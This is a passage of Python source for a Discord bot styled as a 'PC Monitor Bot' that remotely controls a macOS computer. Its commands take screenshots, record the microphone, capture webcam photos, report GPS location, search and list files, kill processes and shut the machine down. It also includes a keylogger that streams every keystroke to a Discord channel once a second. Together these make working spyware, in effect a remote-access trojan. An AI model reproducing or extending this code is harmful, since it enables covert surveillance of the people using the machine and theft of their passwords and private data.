                            name_match = bool(re.search(query, filename))
                        except Exception:
                            continue
                    
                    if name_match:
                        file_path = Path(root) / filename
                        try:
                            stat_info = file_path.stat()
                            file_size = stat_info.st_size
                            mod_time = datetime.fromtimestamp(stat_info.st_mtime).strftime('%Y-%m-%d %H:%M')
                            
                            # Content filtering for small files
                            content_match = True
                            if content and file_size <= 10 * 1024 * 1024:  # Only scan files <= 10MB
                                try:
                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        file_content = f.read().lower()
                                        content_match = content.lower() in file_content
                                except Exception:
                                    content_match = False
                            elif content and file_size > 10 * 1024 * 1024:
                                content_match = False  # Skip large files for content search
                            
                            if content_match:
                                results.append({
                                    'path': str(file_path),
                                    'size': file_size,
                                    'modified': mod_time
                                })
                                
                                if len(results) >= limit:
                                    return {'results': results, 'partial': False}
                        except Exception:
                            continue
            
            return {'results': results, 'partial': False}
        except Exception as e:
            return {'error': f"Search error: {str(e)}"}
    
    # Run in thread to avoid blocking
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, _search_files)

async def search_processes_async(name: str = None, pid: int = None, mode: str = 'name_substring',
                               limit: int = 15, sort_by: str = 'cpu'):
    """Search for processes asynchronously with filtering and sorting."""
    
    def _search_processes():
        try:
            processes = []
            
            # Warm up CPU measurement if sorting by CPU
            if sort_by == 'cpu':
                for proc in psutil.process_iter(['pid']):
                    try:
                        proc.cpu_percent()
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        pass
                time.sleep(0.2)  # Brief pause for CPU measurement
            
            # Collect process information
            for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_info', 'create_time', 'cmdline']):
                try:
                    info = proc.info
                    proc_pid = info.get('pid')
                    proc_name = info.get('name', '')
                    
                    # Apply filters
                    if pid is not None:
                        if proc_pid != pid:
                            continue
                    elif name is not None:
                        if mode == 'name_substring':
                            if name.lower() not in proc_name.lower():
                                continue
                        elif mode == 'name_regex':
                            try:
                                if not re.search(name, proc_name, re.IGNORECASE):
                                    continue
                            except Exception:
                                continue
                    else:
                        return {'error': 'Either name or pid must be provided'}
                    
                    # Get additional info
                    try:
                        cpu_percent = proc.cpu_percent() if sort_by == 'cpu' else 0.0
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        cpu_percent = 0.0
                    
                    try:
                        memory_mb = info.get('memory_info').rss / (1024 * 1024) if info.get('memory_info') else 0.0
                    except (AttributeError, TypeError):
                        memory_mb = 0.0
                    
                    try:
                        username = info.get('username', 'unknown')
                    except Exception:
                        username = 'unknown'
                    
                    try:
                        create_time = info.get('create_time', 0)
                        uptime_seconds = time.time() - create_time if create_time else 0
                        uptime_str = f"{int(uptime_seconds // 3600)}h{int((uptime_seconds % 3600) // 60)}m"
                    except Exception:
                        uptime_str = 'unknown'
                    
                    try:
                        cmdline = info.get('cmdline', [])
                        cmd_str = ' '.join(cmdline[:3]) if cmdline else proc_name  # First 3 args
                        if len(cmd_str) > 50:
                            cmd_str = cmd_str[:47] + "..."
                    except Exception:
                        cmd_str = proc_name
                    
                    processes.append({
                        'pid': proc_pid,
                        'name': proc_name,
                        'username': username,
                        'cpu_percent': cpu_percent,
                        'memory_mb': memory_mb,
                        'uptime': uptime_str,
                        'cmdline': cmd_str
                    })
                    
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            # Sort processes
            if sort_by == 'cpu':
                processes.sort(key=lambda x: x['cpu_percent'], reverse=True)
            elif sort_by == 'mem':
                processes.sort(key=lambda x: x['memory_mb'], reverse=True)
            elif sort_by == 'pid':
                processes.sort(key=lambda x: x['pid'])
            elif sort_by == 'name':
                processes.sort(key=lambda x: x['name'].lower())
            
            return {'results': processes[:limit]}
            
        except Exception as e:
            return {'error': f"Process search error: {str(e)}"}
    
    # Run in thread to avoid blocking
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, _search_processes)

def is_protected_process(pid: int, name: str) -> bool:
    """Check if a process is protected and should not be terminated."""
    # Current bot process
    if pid == os.getpid():
        return True
    
    # System critical PID 1
    if pid == 1:
        return True
    
    # Protected macOS processes (case-insensitive)
    protected_names = {
        'kernel_task', 'launchd', 'windowserver', 'loginwindow', 'systemstats', 
        'syslogd', 'configd', 'coreaudiod', 'mds', 'mds_stores', 'distnoted', 
        'bluetoothd', 'opendirectoryd', 'cfprefsd', 'powerd', 'dock', 'finder', 
        'spotlightd', 'tccd'
    }
    
    name_lower = name.lower()
    return any(protected in name_lower for protected in protected_names)

def is_authorized_user(user_id: int, guild_owner_id: int) -> bool:
    """Check if user is authorized to use the kill command."""
    # Guild owner is always authorized
    if user_id == guild_owner_id:
        return True
    
    # Check against allowed user IDs
    if ALLOWED_USER_IDS:
        allowed_ids = [id.strip() for id in ALLOWED_USER_IDS.split(',') if id.strip()]
        return str(user_id) in allowed_ids
    
    return False

async def terminate_process_async(pid: int = None, name: str = None, signal_type: str = 'TERM', 
                                force: bool = False):
    """Terminate a process asynchronously with safety checks."""
    
    def _terminate_process():
        try:
            # Resolve target process
            if pid is not None:
                try:
                    proc = psutil.Process(pid)
                    proc_name = proc.name()
                except psutil.NoSuchProcess:
                    return {'error': f"Process with PID {pid} not found"}
                except psutil.AccessDenied:
                    return {'error': f"Access denied to process with PID {pid}"}
            elif name is not None:
                # Find processes by name
                matching_procs = []
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if name.lower() in proc.info['name'].lower():
                            matching_procs.append((proc.info['pid'], proc.info['name']))
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue
                
                if not matching_procs:
                    return {'error': f"No process found with name containing '{name}'"}
                elif len(matching_procs) > 1:
                    proc_list = '\n'.join([f"PID {p[0]}: {p[1]}" for p in matching_procs[:10]])
                    return {'error': f"Multiple processes found. Please specify PID:\n{proc_list}"}
                else:
                    pid, proc_name = matching_procs[0]
                    try:
                        proc = psutil.Process(pid)
                    except psutil.NoSuchProcess:
                        return {'error': f"Process {proc_name} (PID {pid}) no longer exists"}
            else:
                return {'error': "Either pid or name must be provided"}
            
            # Safety check - protected processes
            if is_protected_process(pid, proc_name):
                return {'error': "This process is protected and cannot be terminated"}
            
            # Attempt termination
            try:
                if signal_type == 'KILL':
                    proc.kill()
                    time.sleep(2)  # Wait for termination
                    if proc.is_running():
                        return {'error': f"Failed to kill {proc_name} (PID {pid})"}
                    else:
                        return {'success': f"Terminated {proc_name} (PID {pid}) with SIGKILL"}
                else:  # TERM
                    proc.terminate()
                    time.sleep(3)  # Wait for graceful termination
                    
                    if proc.is_running():
                        if force:
                            # Escalate to KILL
                            proc.kill()
                            time.sleep(2)
                            if proc.is_running():
                                return {'error': f"Failed to terminate {proc_name} (PID {pid}) even with force"}
                            else:
                                return {'success': f"Terminated {proc_name} (PID {pid}) with SIGTERM, escalated to SIGKILL"}
                        else:
                            return {'error': f"Process {proc_name} (PID {pid}) did not terminate gracefully. Use force=true to escalate"}
                    else:
                        return {'success': f"Terminated {proc_name} (PID {pid}) with SIGTERM"}
                        
            except psutil.NoSuchProcess:
                return {'success': f"Process {proc_name} (PID {pid}) already terminated"}
            except psutil.AccessDenied:
                return {'error': f"Access denied - cannot terminate {proc_name} (PID {pid})"}
            except Exception as e:
                return {'error': f"Failed to terminate process: {str(e)}"}
                
        except Exception as e:
            return {'error': f"Termination error: {str(e)}"}
    
    # Run in thread to avoid blocking
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, _terminate_process)


def control_youtube_media(action: str):
    """Attempt to control YouTube playback in common browsers. Returns (success, message)."""
    chromium_apps = ['Google Chrome', 'Brave Browser', 'Microsoft Edge', 'Vivaldi', 'Opera']
    for app in chromium_apps:
        if is_process_running([app]):
            # Ensure we're on a YouTube tab
            check = _run_js_in_chromium_app(app, "location.href.includes('youtube.com')||location.href.includes('music.youtube.com')")
            if check.strip().lower() == 'true':
                if _chromium_media_control(app, action):
                    return True, f"Media action '{action}' sent to YouTube ({app})"
                # Fallback: try any YouTube tab across windows
                check_any = _run_js_in_chromium_app_any_youtube_tab(app, "location.href")
                if check_any and ('youtube.com' in check_any or 'music.youtube.com' in check_any):
                    if _chromium_media_control(app, action):
                        return True, f"Media action '{action}' sent to YouTube ({app}) via fallback"
                # Final fallback: activate app and simulate keystrokes
    if is_process_running(['Safari']):
        check = _run_js_in_safari("location.href.includes('youtube.com')||location.href.includes('music.youtube.com')")
        if check.strip().lower() == 'true':
            if _safari_media_control(action):
                return True, f"Media action '{action}' sent to YouTube (Safari)"
            check_any = _run_js_in_safari_any_youtube_tab("location.href")
            if check_any and ('youtube.com' in check_any or 'music.youtube.com' in check_any):
                if _safari_media_control(action):
                    return True, f"Media action '{action}' sent to YouTube (Safari) via fallback"
    return False, "No supported media tab is active"

def on_key_press(key):
    global last_send_time
    if keylogger_active:
        try:
            current_time = time.time()
            
            # add keys to the buffer
            if key == keyboard.Key.space:
                keylogger_data.append('[SPACE]')
            elif key == keyboard.Key.enter:
                keylogger_data.append('[ENTER]\n')
            elif key == keyboard.Key.backspace:
                if keylogger_data:
                    keylogger_data.pop()
            elif key == keyboard.Key.tab:
                keylogger_data.append('[TAB]')
            elif hasattr(key, 'char'):
                keylogger_data.append(key.char)
            else:
                keylogger_data.append(f'[{str(key)}]')
            
            # If one second has passed frm last send, send data and reset
            if current_time - last_send_time >= 1.0:
                if keylogger_channel and keylogger_data:
                    asyncio.run_coroutine_threadsafe(
                        keylogger_channel.send(f"```{''.join(keylogger_data)}```"),
                        bot.loop
                    )
                    keylogger_data.clear()  # reset buffer
                    last_send_time = current_time
                
        except Exception as e:
            logger.error(f"Error in keylogger: {str(e)}")

def check_camera_permission():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return False
    cap.release()
    return True

def check_microphone_permission():
    try:
        sd.check_input_settings()
        return True
    except Exception:
        return False

# debug error reporting
async def send_error(ctx, context, error):
    """Send a formatted error message to Discord and log it."""
    logger.error(f"Error in {context}: {str(error)}")
    await ctx.send(f"[Error in {context}] {str(error)}")

# Bot Commands
@bot.event
async def on_ready():
    logger.info(f'Bot is ready! Logged in as {bot.user.name}')
    try:
        synced_global = await bot.tree.sync()
        logger.info(f'Synced {len(synced_global)} global command(s)')
        # Force per-guild sync for immediate updates to choices/options
        for guild in bot.guilds:
            try:
                synced_guild = await bot.tree.sync(guild=guild)
                logger.info(f"Synced {len(synced_guild)} guild command(s) for guild {guild.name} ({guild.id})")
            except Exception as e:
                logger.error(f"Failed to sync guild commands for {guild.name} ({guild.id}): {e}")
    except Exception as e:
        logger.error(f'Failed to sync commands: {e}')
    
    # Find the "pc-monitor" channel specifically
    target_channel = None
    for guild in bot.guilds:
        for channel in guild.text_channels:
            if channel.name == "pc-monitor":
                target_channel = channel
                break
        if target_channel:
            break
    
    # If pc-monitor channel found, send message there
    if target_channel:
        try:
            await target_channel.send(f"🤖 PC Monitor Bot is online! Use slash commands (start typing `/`) to see available commands. <@955067999713361981>")
            # perm check
            if not check_camera_permission():
                await target_channel.send("⚠️ [Warning] Camera permission required. Please enable it in System Preferences > Security & Privacy > Privacy > Camera.")
            if not check_microphone_permission():
                await target_channel.send("⚠️ [Warning] Microphone permission required. Please enable it in System Preferences > Security & Privacy > Privacy > Microphone.")
        except discord.Forbidden:
            logger.error("No permission to send messages in pc-monitor channel")
        except Exception as e:
            logger.error(f"Error sending ready message to pc-monitor channel: {str(e)}")
    else:
        logger.warning("pc-monitor channel not found. Bot is ready but no startup message sent.")
        # Fallback: send to first available channel
        for guild in bot.guilds:
            for channel in guild.text_channels:
                try:
                    await channel.send(f"🤖 PC Monitor Bot is online! (pc-monitor channel not found) Use slash commands (start typing `/`) to see available commands. <@955067999713361981>")
                    return
                except discord.Forbidden:
                    continue
                except Exception as e:
                    logger.error(f"Error sending fallback ready message: {str(e)}")
                    continue

@bot.event
async def on_message(message):
    logger.info(f'Received message: {message.content} from {message.author}')
    if message.author == bot.user:
        return
    await bot.process_commands(message)

@bot.tree.command(name='help', description='Show all available commands')
async def help_command(interaction: discord.Interaction):
    help_text = """
**PC Monitor Bot Commands**
/ss - Take a screenshot
/mic - Record audio from the microphone
/media - Control media playback (play/pause/next/prev)
/volume - Set system volume (0-100%)
/power - Control system power (sleep/restart/shutdown)
/keylogger - Start or stop the keylogger
/sysinfo - Show comprehensive system information (location, battery, CPU, RAM, etc.)
/ip - Show IP address
/locate - Get precise location with GPS coordinates and timestamp
/uptime - Show system uptime
/processes - Show top 15 processes by CPU or RAM usage
/camera - Take a webcam photo
/find - Search files by name/regex, optional content filter
/find-process - Find processes by name/PID; use before /kill. Alias: /find-proccess
/kill - Terminate a process by PID (recommended) or name, with safety checks
/all - Run all monitoring commands
/debug - Check the status of screenshot, audio recording, camera, and key system functions
"""
    await interaction.response.send_message(help_text)

@bot.tree.command(name='ss', description='Take a screenshot of the current screen')
async def screenshot(interaction: discord.Interaction):
    try:
        await interaction.response.defer()
        screenshot_path = take_screenshot()
        await interaction.followup.send("🟢 Screenshot taken", file=discord.File(screenshot_path))
    except Exception as e:
        logger.error(f"Error in screenshot: {str(e)}")
        if not interaction.response.is_done():
            await interaction.response.send_message(f"[Error in screenshot] {str(e)}\nIf you are on macOS, check System Settings > Privacy & Security > Screen Recording.")
        else:
            await interaction.followup.send(f"[Error in screenshot] {str(e)}\nIf you are on macOS, check System Settings > Privacy & Security > Screen Recording.")
    finally:
        if 'screenshot_path' in locals() and os.path.exists(screenshot_path):
            os.remove(screenshot_path)

@bot.tree.command(name='mic', description='Record 10 seconds of audio from the microphone')
async def record(interaction: discord.Interaction):
    try:
        await interaction.response.defer()
        audio_path = record_audio()
        await interaction.followup.send("🎤 Audio recorded", file=discord.File(audio_path))
        os.remove(audio_path)
    except Exception as e:
        logger.error(f"Error recording audio: {str(e)}")
        if not interaction.response.is_done():
            await interaction.response.send_message(f"Error recording audio: {str(e)}")
        else:
            await interaction.followup.send(f"Error recording audio: {str(e)}")

@bot.tree.command(name='media', description='Control media playback using system media keys')
@discord.app_commands.describe(action='Media action to perform')
@discord.app_commands.choices(action=[
    discord.app_commands.Choice(name='Play/Pause', value='play'),
    discord.app_commands.Choice(name='Next Track', value='next'),
    discord.app_commands.Choice(name='Previous Track', value='prev')
])
async def media_control(interaction: discord.Interaction, action: discord.app_commands.Choice[str]):
    """Simple and reliable media control using pyautogui media keys."""
    try:
        success, message = control_media(action.value)
        
        if success:
            await interaction.response.send_message(f"🎵 {message}")
        else:
            await interaction.response.send_message(f"⚠️ {message}")
            
    except Exception as e:
        logger.error(f"Error in media command: {str(e)}")
        await interaction.response.send_message(f"⚠️ Error controlling media: {str(e)}")

@bot.tree.command(name='volume', description='Set system volume')
@discord.app_commands.describe(level='Volume level (0-100)')
async def volume(interaction: discord.Interaction, level: int):
    success, result = set_volume(level)
    if success:
        await interaction.response.send_message(f"🔊 Volume set to {result}%")
    else:
        await interaction.response.send_message(f"Error setting volume: {result}")

@bot.tree.command(name='power', description='Control system power state (shutdown, restart, sleep)')
@discord.app_commands.describe(action='Power action to perform')
@discord.app_commands.choices(action=[
    discord.app_commands.Choice(name='💤 Sleep', value='sleep'),
    discord.app_commands.Choice(name='🔄 Restart', value='restart'),
    discord.app_commands.Choice(name='⚡ Shutdown', value='shutdown')
])
async def power_control(interaction: discord.Interaction, action: discord.app_commands.Choice[str]):
    """Control system power state with confirmation and warnings."""
    try:
        # Add warning for destructive actions
        if action.value in ['shutdown', 'restart']:
            warning_msg = f"⚠️ **WARNING**: This will {action.value} the system immediately!\n"
            warning_msg += f"🖥️ **Action**: {action.name}\n"
            from datetime import datetime
            warning_msg += f"⏰ **Time**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            warning_msg += f"🔒 **Note**: This action cannot be undone remotely\n\n"
            warning_msg += f"Proceeding with {action.value}..."
            
            await interaction.response.send_message(warning_msg)
            
            # Small delay to ensure the message is sent before system action
            await asyncio.sleep(2)
            
            success, result = control_system_power(action.value)
            
            if success:
                # This message might not be sent if shutdown/restart is immediate
                try:
                    await interaction.followup.send(f"✅ {result}")
                except Exception:
                    pass  # System might be shutting down
            else:
                await interaction.followup.send(f"❌ {result}")
                
        else:  # Sleep action
            await interaction.response.send_message(f"😴 Putting system to sleep...")
            
            success, result = control_system_power(action.value)
            
            if success:
                try:
                    await interaction.followup.send(f"✅ {result}")
                except Exception:
                    pass  # System might be sleeping
            else:
                await interaction.followup.send(f"❌ {result}")
                
    except Exception as e:
        logger.error(f"Error in power control: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error controlling power: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error controlling power: {str(e)}")
        except Exception:
            pass

@bot.tree.command(name='keylogger', description='Start or stop the keylogger')
@discord.app_commands.describe(action='Keylogger action')
@discord.app_commands.choices(action=[
    discord.app_commands.Choice(name='Start', value='start'),
    discord.app_commands.Choice(name='Stop', value='stop')
])
async def toggle_keylogger(interaction: discord.Interaction, action: discord.app_commands.Choice[str]):
    global keylogger_active, keylogger_listener, keylogger_channel, last_send_time
    try:
        if action.value == 'start':
            if not keylogger_active:
                keylogger_active = True
                keylogger_data.clear()
                keylogger_channel = interaction.channel
                last_send_time = time.time()
                keylogger_listener = keyboard.Listener(on_press=on_key_press)
                keylogger_listener.start()
                await interaction.response.send_message("⌨️ Keylogger started - sending keystrokes every second")
            else:
                await interaction.response.send_message("Keylogger is already running")
        elif action.value == 'stop':
            if keylogger_active:
                keylogger_active = False
                if keylogger_listener:
                    keylogger_listener.stop()
                    keylogger_listener = None
                # send remaining data before stop
                if keylogger_channel and keylogger_data:
                    await interaction.response.send_message(f"```{''.join(keylogger_data)}```")
                else:
                    await interaction.response.send_message("⌨️ Keylogger stopped")
                keylogger_data.clear()
                keylogger_channel = None
            else:
                await interaction.response.send_message("Keylogger is not running")
    except Exception as e:
        logger.error(f"Error with keylogger: {str(e)}")
        await interaction.response.send_message(f"Error with keylogger: {str(e)}")

@bot.tree.command(name='sysinfo', description='Show comprehensive system information (location, battery, CPU, RAM, etc.)')
async def system_info(interaction: discord.Interaction):
    try:
        await interaction.response.defer()  # This might take a few seconds due to network requests
        info = get_system_info()
        await interaction.followup.send(f"```{info}```")
    except Exception as e:
        logger.error(f"Error getting system info: {str(e)}")
        if not interaction.response.is_done():
            await interaction.response.send_message(f"Error getting system info: {str(e)}")
        else:
            await interaction.followup.send(f"Error getting system info: {str(e)}")

@bot.tree.command(name='ip', description='Show the system IP address')
async def ip_address(interaction: discord.Interaction):
    try:
        ip = get_ip_address()
        await interaction.response.send_message(f"🌐 IP Address: {ip}")
    except Exception as e:
        logger.error(f"Error getting IP address: {str(e)}")
        await interaction.response.send_message(f"Error getting IP address: {str(e)}")

@bot.tree.command(name='locate', description='Get precise location with GPS coordinates and timestamp')
async def locate(interaction: discord.Interaction):
    """Get current location using macOS Location Services (GPS-only)."""
    try:
        await interaction.response.defer()  # This may take time for location services
        
        location_data = get_precise_location()
        
        if location_data['success']:
            # Format the response message
            response_lines = []
            response_lines.append(f"📍 **Location Retrieved**: {location_data['timestamp']} {location_data['timezone']}")
            response_lines.append("")
            
            if location_data['latitude'] and location_data['longitude']:
                lat = location_data['latitude']
                lon = location_data['longitude']
                
                # Format coordinates with proper precision
                response_lines.append(f"🌐 **GPS Coordinates**: {lat:.6f}, {lon:.6f}")
                
                if location_data['address']:
                    response_lines.append(f"🏠 **Address**: \n{location_data['address']}")
                
                # Add map links
                google_maps_url = f"https://maps.google.com/?q={lat},{lon}"
                apple_maps_url = f"http://maps.apple.com/?q={lat},{lon}"
                response_lines.append(f"🗺️ **Maps**: [Google Maps]({google_maps_url}) | [Apple Maps]({apple_maps_url})")
                
            else:
                response_lines.append("❌ **Coordinates**: Not available")
                if location_data['address']:
                    response_lines.append(f"🏠 **Address**: {location_data['address']}")
            
            response_text = "\n".join(response_lines)
            await interaction.followup.send(response_text)
            
        else:
            # Location failed - provide detailed setup instructions
            error_message = f"❌ **Location Failed**: {location_data['error']}\n\n"
            
            if "not found" in location_data['error']:
                error_message += "🔧 **Required Setup - Create Location Shortcut**:\n"
                error_message += "1. Open **Shortcuts** app on macOS\n"
                error_message += "2. Click **'+'** to create new shortcut\n"
                error_message += "3. Name it exactly: **'Get Location Data'**\n"
                error_message += "4. Search and add **'Get Current Location'** action\n"
                error_message += "5. Save the shortcut\n"
                error_message += "6. **Test manually**: Run shortcut to grant permissions\n"
            elif "permission" in location_data['error'].lower():
                error_message += "🔐 **Location Permission Required**:\n"
                error_message += "1. Open **System Preferences > Security & Privacy**\n"
                error_message += "2. Go to **Privacy > Location Services**\n"
                error_message += "3. Enable **Location Services** (if disabled)\n"
                error_message += "4. Find **Shortcuts** app and enable it\n"
                error_message += "5. Retry the `/locate` command\n"
            else:
                error_message += "🔧 **Troubleshooting**:\n"
                error_message += "• Ensure **Shortcuts** app is installed (macOS 12+)\n"
                error_message += "• Create shortcut named **'Get Location Data'**\n"
                error_message += "• Grant location permissions to Shortcuts app\n"
                error_message += "• Test shortcut manually before using bot\n"
            
            error_message += "\n🌍 **Note**: This command requires GPS-based location services"
            error_message += "\n🔒 **Privacy**: Location data is processed locally and sent only to Discord"
            
            await interaction.followup.send(error_message)
            
    except Exception as e:
        logger.error(f"Error in locate command: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error getting location: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error getting location: {str(e)}")
        except Exception:
            pass  # If we can't send error message, just log it

@bot.tree.command(name='uptime', description='Show system uptime')
async def uptime(interaction: discord.Interaction):
    try:
        uptime_str = get_uptime()
        await interaction.response.send_message(f"⏱️ Uptime: {uptime_str}")
    except Exception as e:
        logger.error(f"Error getting uptime: {str(e)}")
        await interaction.response.send_message(f"Error getting uptime: {str(e)}")

@bot.tree.command(name='processes', description='Show top 15 processes by CPU or RAM usage')
@discord.app_commands.describe(sort_by='Sort processes by CPU or RAM usage')
@discord.app_commands.choices(sort_by=[
    discord.app_commands.Choice(name='RAM Usage', value='ram'),
    discord.app_commands.Choice(name='CPU Usage', value='cpu')
])
async def processes(interaction: discord.Interaction, sort_by: discord.app_commands.Choice[str]):
    try:
        processes = get_top_processes(sort_by=sort_by.value, limit=15)
        
        if sort_by.value == 'cpu':
            top_processes = "Top 15 processes by CPU usage:\n"
            for proc in processes:
                pid_list = ", ".join(map(str, proc['pids']))
                cpu_percent = proc['cpu_percent']
                count_text = f" ({proc['count']} processes)" if proc['count'] > 1 else ""
                top_processes += f"**{proc['name']}**{count_text} (PID {pid_list}): {cpu_percent:.1f}%\n"
        else:  # RAM
            top_processes = "Top 15 processes by memory usage (RSS):\n"
            for proc in processes:
                pid_list = ", ".join(map(str, proc['pids']))
                mb = proc['rss'] / (1024 * 1024)
                count_text = f" ({proc['count']} processes)" if proc['count'] > 1 else ""
                top_processes += f"**{proc['name']}**{count_text} (PID {pid_list}): {mb:.2f} MB\n"
        
        await interaction.response.send_message(f"📊 ```{top_processes}```")
    except Exception as e:
        logger.error(f"Error getting processes: {str(e)}")
        await interaction.response.send_message(f"Error getting processes: {str(e)}")

@bot.tree.command(name='camera', description='Take a photo using the webcam')
async def camera(interaction: discord.Interaction):
    try:
        await interaction.response.defer()
        photo_path = take_webcam_photo()
        if photo_path:
            await interaction.followup.send("📷 Webcam photo taken", file=discord.File(photo_path))
            os.remove(photo_path)
        else:
            await interaction.followup.send("Failed to capture webcam photo")
    except Exception as e:
        logger.error(f"Error capturing from camera: {str(e)}")
        if not interaction.response.is_done():
            await interaction.response.send_message(f"Error capturing from camera: {str(e)}")
        else:
            await interaction.followup.send(f"Error capturing from camera: {str(e)}")

@bot.tree.command(name='all', description='Run all monitoring commands')
async def execute_all(interaction: discord.Interaction):
    try:
        await interaction.response.defer()
        results = []
        screenshot_path = take_screenshot()
        await interaction.followup.send("🟢 Screenshot taken", file=discord.File(screenshot_path))
        os.remove(screenshot_path)
        results.append("✓ Screenshot")
        audio_path = record_audio()
        await interaction.followup.send("🎤 Audio recorded", file=discord.File(audio_path))
        os.remove(audio_path)
        results.append("✓ Audio recording")
        system_info = get_system_info()
        await interaction.followup.send(f"```{system_info}```")
        results.append("✓ System info")
        ip = get_ip_address()
        await interaction.followup.send(f"🌐 IP Address: {ip}")
        results.append("✓ IP address")
        uptime_str = get_uptime()
        await interaction.followup.send(f"⏱️ Uptime: {uptime_str}")
        results.append("✓ Uptime")
        processes = get_top_processes(sort_by='ram', limit=15)
        top_processes = "Top 15 processes by memory usage (RSS):\n"
        for proc in processes:
            pid_list = ", ".join(map(str, proc['pids']))
            mb = proc['rss'] / (1024 * 1024)
            count_text = f" ({proc['count']} processes)" if proc['count'] > 1 else ""
            top_processes += f"**{proc['name']}**{count_text} (PID {pid_list}): {mb:.2f} MB\n"
        await interaction.followup.send(f"📊 ```{top_processes}```")
        results.append("✓ Process list")
        photo_path = take_webcam_photo()
        if photo_path:
            await interaction.followup.send("📷 Webcam photo taken", file=discord.File(photo_path))
            os.remove(photo_path)
            results.append("✓ Webcam photo")
        summary = "All functions executed:\n" + "\n".join(results)
        await interaction.followup.send(f"```{summary}```")
    except Exception as e:
        logger.error(f"Error in execute_all: {str(e)}")
        if not interaction.response.is_done():
            await interaction.response.send_message(f"Error executing all functions: {str(e)}")
        else:
            await interaction.followup.send(f"Error executing all functions: {str(e)}")

@bot.tree.command(name='find', description='Search files by name/regex, optional content filter')
@discord.app_commands.describe(
    query='Search pattern (supports *.log, report_*.pdf for glob mode or regex patterns)',
    path='Directory to search in (defaults to home directory)', 
    mode='Search mode for filename matching',
    content='Case-insensitive substring to search within files (≤10MB)',
    limit='Maximum number of files to return',
    depth='Maximum directory depth to search',
    include_hidden='Include hidden files and directories'
)
@discord.app_commands.choices(mode=[
    discord.app_commands.Choice(name='Glob Pattern (*.txt, file_*.log)', value='name_glob'),
    discord.app_commands.Choice(name='Regex Pattern (^report_\\d+\\.pdf$)', value='name_regex')
])
async def find_files(interaction: discord.Interaction, query: str, path: str = None, 
                    mode: discord.app_commands.Choice[str] = None, content: str = None,
                    limit: int = 100, depth: int = 6, include_hidden: bool = False):
    try:
        await interaction.response.defer(thinking=True)
        
        # Set defaults
        search_path = path if path else FIND_DEFAULT_PATH
        search_mode = mode.value if mode else 'name_glob'
        
        # Validate parameters
        if limit > 2000:
            limit = 2000
        if depth > 20:
            depth = 20
            
        # Perform search
        result = await search_files_async(
            query=query,
            path=search_path, 
            mode=search_mode,
            content=content,
            limit=limit,
            depth=depth,
            include_hidden=include_hidden
        )
        
        if 'error' in result:
            await interaction.followup.send(f"❌ Search failed: {result['error']}")
            return
        
        files = result.get('results', [])
        partial = result.get('partial', False)
        message = result.get('message', '')
        
        if not files:
            await interaction.followup.send("🔍 No files matched your criteria.")
            return
        
        # Format results
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Show preview (up to 10 files)
        preview_text = f"🔍 **Found {len(files)} file{'s' if len(files) != 1 else ''}**"
        if partial:
            preview_text += f" ({message})"
        preview_text += f"\n**Search**: `{query}` in `{search_path}`\n"
        if content:
            preview_text += f"**Content filter**: `{content}`\n"
        preview_text += "\n"
        
        for i, file_info in enumerate(files[:10]):
            size_mb = file_info['size'] / (1024 * 1024)
            if size_mb >= 1:
                size_str = f"{size_mb:.1f}MB"
            elif file_info['size'] >= 1024:
                size_str = f"{file_info['size'] // 1024}KB"
            else:
                size_str = f"{file_info['size']}B"
            
            preview_text += f"- `{file_info['path']}` ({size_str}, {file_info['modified']})\n"
        
        if len(files) > 10:
            preview_text += f"\n... and {len(files) - 10} more files (see attachment)"
        
        # Create attachment with full results
        results_content = '\n'.join([file_info['path'] for file_info in files])
        results_filename = f"results_find_{timestamp}.txt"
        
        with open(results_filename, 'w', encoding='utf-8') as f:
            f.write(results_content)
        
        await interaction.followup.send(
            preview_text,
            file=discord.File(results_filename)
        )
        
        # Clean up
        os.remove(results_filename)
        
    except Exception as e:
        logger.error(f"Error in find command: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error searching files: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error searching files: {str(e)}")
        except Exception:
            pass

@bot.tree.command(name='find-process', description='Search processes by name/PID; use before /kill')
@discord.app_commands.describe(
    name='Process name substring or regex pattern',
    pid='Exact process ID to find',
    mode='Search mode for process name matching',
    limit='Maximum number of processes to return',
    sort_by='Sort processes by the specified criteria'
)
@discord.app_commands.choices(
    mode=[
        discord.app_commands.Choice(name='Substring Match (Chrome)', value='name_substring'),
        discord.app_commands.Choice(name='Regex Pattern (python.*server)', value='name_regex')
    ],
    sort_by=[
        discord.app_commands.Choice(name='CPU Usage', value='cpu'),
        discord.app_commands.Choice(name='Memory Usage', value='mem'), 
        discord.app_commands.Choice(name='Process ID', value='pid'),
        discord.app_commands.Choice(name='Process Name', value='name')
    ]
)
async def find_process(interaction: discord.Interaction, name: str = None, pid: int = None,
                      mode: discord.app_commands.Choice[str] = None, limit: int = 15,
                      sort_by: discord.app_commands.Choice[str] = None):
    try:
        await interaction.response.defer(thinking=True)
        
        # Validate parameters
        if not name and pid is None:
            await interaction.followup.send("❌ Please provide either a process name or PID to search for.")
            return
        
        if limit > 100:
            limit = 100
            
        # Set defaults
        search_mode = mode.value if mode else 'name_substring'
        sort_criteria = sort_by.value if sort_by else 'cpu'
        
        # Perform search
        result = await search_processes_async(
            name=name,
            pid=pid,
            mode=search_mode,
            limit=limit,
            sort_by=sort_criteria
        )
        
        if 'error' in result:
            await interaction.followup.send(f"❌ Process search failed: {result['error']}")
            return
        
        processes = result.get('results', [])
        
        if not processes:
            search_term = f"PID {pid}" if pid is not None else f"name '{name}'"
